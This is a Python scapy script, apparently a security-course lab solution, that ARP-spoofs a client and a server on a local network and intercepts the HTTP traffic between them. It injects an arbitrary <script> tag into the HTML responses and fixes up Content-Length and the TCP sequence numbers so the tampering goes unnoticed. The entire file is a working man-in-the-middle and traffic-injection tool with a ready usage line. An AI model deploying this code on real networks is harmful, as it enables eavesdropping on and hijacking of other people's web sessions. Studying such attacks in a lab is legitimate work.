# python3 cp2.1.http.py -i eth0 --clientIP 10.4.22.223 --serverIP 10.4.22.38 --script "alert('hi')"
# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *

import argparse
import os
import re
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-s", "--script", help="script to inject", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()

def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()

# TODO: returns the mac address for an IP
def mac(IP):
    return getmacbyip(IP)

def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, serverIP, serverMAC) # Spoof server ARP table
        time.sleep(interval)

# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(src_ip, src_mac, dst_ip, dst_mac):
    debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
    pkt = Ether(src=src_mac, dst=dst_mac) / ARP(hwsrc=src_mac, psrc=src_ip, hwdst=dst_mac, pdst=dst_ip, op=2)
    sendp(pkt, inter=0.1)

# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    pkt = ARP(hwsrc=srcMAC, psrc=srcIP, hwdst=dstMAC, pdst=dstIP, op=2)
    send(pkt, inter=2)
    
# TODO: handle intercepted packets
# packets have arbitrary length, </body> tag can be splited. 
def interceptor(packet):

    global log, clientMAC, clientIP, serverMAC, \
    serverIP, attackerMAC, attackerIP, script, mtu, buffer, fin
    
    # If it is an outbound packet, then do nothing
    if packet[Ether].src == attackerMAC:
        return
        
    if packet.haslayer(IP):
    
        # If it is sent to attacker, then do nothing
        if packet[IP].dst == attackerIP:
            return
            
        if packet.haslayer(TCP):
            sport = packet[TCP].sport
            dport = packet[TCP].dport

            # From sever to client
            if packet[IP].dst == clientIP:
                
                packet[TCP].seq += log.get(dport, [0, 0, 0])[0]
                
                # If it is FIN from server to client, set fin bit
                # Note the second condition log.get(dport) has to be true, otherwise it is a retransmission
                # Because only after receving the FIN, we delete the log[dport]
                if packet[TCP].flags & 0x01 and log.get(dport, []):
                    log[dport][2] = 1
                    
                # Inject script
                if packet.haslayer(Raw):
                
                    payload = buffer + packet[Raw].load
                    buffer = b""
                    content_length_start = -1
                    content_length_end = 0
                    body_start = -1
                    html_start = 0
                    header_len = len(packet[IP]) - len(packet[Raw])
                    expected_len = log.get(dport, [0, 0, 0])[1]

                    if b"Content-Length: " in payload:
                        content_length_start = payload.index(b"Content-Length: ") + 16
                        content_length_end = content_length_start
                        while payload[content_length_end] != ord("\r"):
                            content_length_end += 1
                        html_start = packet[Raw].load.index(b"<html>")
                            
                    if b"</body>" in payload:
                        body_start = payload.index(b"</body>")
                        
                    # TODO add expected length to log
                    # Reconstruct payload
                    injected = b""
                    if content_length_start != -1:
                        expected_len = int(payload[content_length_start:\
                        content_length_end].decode())
                        injected += payload[:content_length_start] + str(expected_len + len(script)).encode()
                    
                    if body_start != -1:
                        injected += payload[content_length_end:body_start] + script + \
                        payload[body_start:]
                        
                    else:
                        injected += payload[content_length_end:-6]
                        # split last 6 bytes so that splited </body> can reunion
                        buffer = payload[-6:]
                    
                    # If injected packet is larget than mtu
                    if len(injected) + header_len > mtu:
                        buffer = injected[-len(injected)+header_len-mtu:] + buffer
                        injected = injected[:-len(injected)+header_len-mtu]
                    
                    # Update how many bytes are injected
                    injected_len = len(injected) - len(packet[Raw].load)
                    
                    # Update how many bytes to come for the current http payload
                    expected_len -= len(packet[Raw].load) - html_start
                    if dport in log:
                    
                        # Do nothing to retransmission
                        if log[dport][1] == 0:
                            return
                        
                        log[dport][0] += injected_len
                        log[dport][1] = expected_len
                    else:
                        log[dport] = [injected_len, expected_len, 0]
                    
                    packet[Raw].load = injected
                    #print(log[dport], dport)    
            elif packet[IP].dst == serverIP:
                packet[TCP].ack -= log.get(sport, [0, 0, 0])[0]
                
                # If client has received FIN, delete log
                if log.get(sport, [0, 0, 0])[2]:
                    del log[sport]
            del packet[TCP].chksum
            
        # If it is not supposed to send to attacker, then forward it anyway
        if packet[IP].dst == serverIP:
            packet[Ether].dst = serverMAC
        elif packet[IP].dst == clientIP:
            packet[Ether].dst = clientMAC
        packet[Ether].src = attackerMAC
        del packet[IP].len
        del packet[IP].chksum
        
        sendp(packet)
        
        # If sever has already sent all bytes, but still has overflow,
        # send the buffer without waiting the next pkt
        # if not log.get(dport, [0, 1, 0])[1] and buffer:
            # packet[Raw].load = buffer
            # sendp(packet)
 
if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    serverIP = args.serverIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)
    
    script = ("<script>" + args.script + "</script>").encode()
    mtu = 1500 # IP + TCP + payload
    log = {}   # dport: [injected_len, expected_len, fin]
    buffer = b""
    
    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)